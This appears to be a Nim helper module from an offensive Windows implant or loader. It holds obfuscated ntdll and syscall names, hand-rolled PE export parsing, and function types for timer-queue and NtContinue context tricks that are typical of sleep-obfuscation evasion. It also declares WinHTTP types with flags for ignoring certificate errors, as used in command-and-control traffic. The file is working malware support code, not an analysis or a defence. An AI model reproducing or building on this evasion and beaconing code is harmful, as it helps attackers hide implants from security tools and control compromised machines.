import ../global

let ntdllPath* = obf(r"C:\Windows\System32\ntdll.dll")
let syscallApis* = [
  obf("NtProtectVirtualMemory"),
  obf("NtWaitForSingleObject"),
  obf("NtCreateEvent"),
  obf("NtSetEvent"),
  obf("NtSignalAndWaitForSingleObject"),
  obf("NtClose"),
  obf("NtQuerySystemInformation"),
]

type
  TCreateFileW* = proc(n: pointer; a, s: culong; sec: pointer; d, f, t: culong): pointer {.stdcall.}
  TReadFile* = proc(h, b: pointer; sz: culong; rd: ptr culong; o: pointer): culong {.stdcall.}
  TCloseHandle* = proc(h: pointer): culong {.stdcall.}
  TGetFileSize* = proc(h: pointer; hi: ptr culong): culong {.stdcall.}
  TVirtualAlloc* = proc(lp: pointer; sz: csize_t; t, p: culong): pointer {.stdcall.}
  TVirtualFree* = proc(lp: pointer; sz: csize_t; t: culong): culong {.stdcall.}
  TGetModuleHandleA* = proc(name: cstring): pointer {.stdcall.}
  TVirtualProtect* = proc(lp: pointer; sz: culong; np: culong; lpOldProtect: ptr culong): culong {.stdcall.}
  TLoadLibraryA* = proc(lib: cstring): pointer {.stdcall.}
  TGetProcAddress* = proc(hMod, name: pointer): pointer {.stdcall.}
  TSleep* = proc(ms: culong) {.stdcall.}
  TGetTickCount* = proc(): culong {.stdcall.}
  TWaitForSingleObjectEx* = proc(h: pointer; ms: culong; alertable: culong): culong {.stdcall.}
  TRtlCreateTimerQueue* = proc(queue: ptr pointer): culong {.stdcall.}
  TRtlCreateTimer* = proc(queue: pointer; timer: ptr pointer; cb, ctx: pointer; due, period, flags: culong): culong {.stdcall.}
  TRtlDeleteTimerQueue* = proc(queue: pointer): culong {.stdcall.}
  TRtlDeleteTimerQueueEx* = proc(queue, completionEvent: pointer): culong {.stdcall.}
  TRtlRegisterWait* = proc(wait: ptr pointer; handle: pointer; cb, ctx: pointer; ms, flags: culong): culong {.stdcall.}
  TRtlDeregisterWait* = proc(wait: pointer): culong {.stdcall.}
  TRtlCaptureContext* = proc(ctx: pointer) {.stdcall.}
  TNtContinue* = proc(ctx: pointer; alert: culong): culong {.stdcall.}
  TNtSetEvent* = proc(ev: pointer; prev: ptr culong): culong {.stdcall.}
  TNtWait* = proc(h: pointer; alertable: culong; timeout: pointer): culong {.stdcall.}
  TNtCreateEvent* = proc(h: ptr pointer; access: culong; oa: pointer; typ, state: culong): culong {.stdcall.}
  TNtSignalAndWait* = proc(sig, wait: pointer; alert: culong; timeout: pointer): culong {.stdcall.}
  TNtClose* = proc(h: pointer): culong {.stdcall.}
  TNtProtect* = proc(procH: pointer; base: ptr pointer; size: ptr csize_t; prot: culong; old: ptr culong): culong {.stdcall.}
  TNtQuerySys* = proc(cls: culong; info: pointer; len: culong; retLen: ptr culong): culong {.stdcall.}
  TGetCurrentProcessId* = proc(): culong {.stdcall.}
  TGetCurrentThreadId* = proc(): culong {.stdcall.}
  TOpenThread* = proc(access, inherit: culong; tid: culong): pointer {.stdcall.}
  TWinHttpOpen* = proc(agent: pointer; access: culong; proxy, bypass: pointer; flags: culong): pointer {.stdcall.}
  TWinHttpConnect* = proc(session: pointer; host: pointer; port: uint16; flags: culong): pointer {.stdcall.}
  TWinHttpOpenRequest* = proc(conn: pointer; verb, path, version, referrer: pointer; accept: pointer; flags: culong): pointer {.stdcall.}
  TWinHttpSendRequest* = proc(req: pointer; headers: pointer; hlen: culong; body: pointer; blen, total: culong; ctx: culong): culong {.stdcall.}
  TWinHttpReceiveResponse* = proc(req: pointer; reserved: pointer): culong {.stdcall.}
  TWinHttpQueryHeaders* = proc(req: pointer; level: culong; name: pointer; buf: pointer; blen: ptr culong; idx: ptr culong): culong {.stdcall.}
  TWinHttpReadData* = proc(req: pointer; buf: pointer; toRead: culong; read: ptr culong): culong {.stdcall.}
  TWinHttpCloseHandle* = proc(h: pointer): culong {.stdcall.}
  TWinHttpSetOption* = proc(h: pointer; opt: culong; buf: pointer; blen: culong): culong {.stdcall.}
  TWinHttpAddRequestHeaders* = proc(req: pointer; headers: pointer; hlen: culong; mods: culong): culong {.stdcall.}

proc u32*(p: pointer; o: int = 0): culong {.inline.} =
  # Reads a 32 bit value from the pointer at the offset
  cast[ptr culong](cast[int](p) + o)[]

proc exportRva*(nt: pointer): culong =
  # Reads the export directory rva from the nt headers
  let opt = cast[pointer](cast[int](nt) + 24)
  let magic = cast[ptr uint16](opt)[]
  let off = if magic == 0x20B'u16: 112 else: 96
  u32(opt, off)

proc rva*(buf: pointer; rva: culong; nt: pointer): pointer =
  # Finds the section for the rva and returns the pointer
  let nsec = cast[ptr uint16](cast[int](nt) + 6)[]
  let opt = cast[ptr uint16](cast[int](nt) + 20)[]
  var sec = cast[int](nt) + 24 + opt.int
  for _ in 0 ..< nsec.int:
    let s = cast[pointer](sec)
    let va = u32(s, 12)
    if rva >= va and rva < va + u32(s, 16):
      return cast[pointer](cast[int](buf) + u32(s, 20).int + (rva - va).int)
    sec += 40
  nil

const
  PAGE_NOACCESS* = culong(0x01)
  PAGE_READONLY* = culong(0x02)
  PAGE_READWRITE* = culong(0x04)
  PAGE_EXECUTE_READ* = culong(0x20)
  PAGE_EXECUTE_READWRITE* = culong(0x40)
  INFINITE* = culong(0xFFFFFFFF)
  contextFull* = culong(0x10001F)
  wtExecuteInTimerThread* = culong(0x20)
  wtExecuteOnlyOnce* = culong(0x8)
  wtExecuteInWaitThread* = culong(0x4)
  notificationEvent* = culong(1)
  eventAllAccess* = culong(0x1F0003)
  # winhttp
  winhttpAccessAutomaticProxy* = culong(4)
  winhttpFlagSecure* = culong(0x00800000)
  winhttpAddreqFlagAdd* = culong(0x20000000)
  winhttpAddreqFlagReplace* = culong(0x80000000)
  winhttpQueryStatusCode* = culong(19)
  winhttpQueryFlagNumber* = culong(0x20000000)
  winhttpOptionSecurityFlags* = culong(31)
  securityFlagIgnoreUnknownCa* = culong(0x00000100)
  securityFlagIgnoreCertWrongUsage* = culong(0x00000200)
  securityFlagIgnoreCertCnInvalid* = culong(0x00001000)
  securityFlagIgnoreCertDateInvalid* = culong(0x00002000)
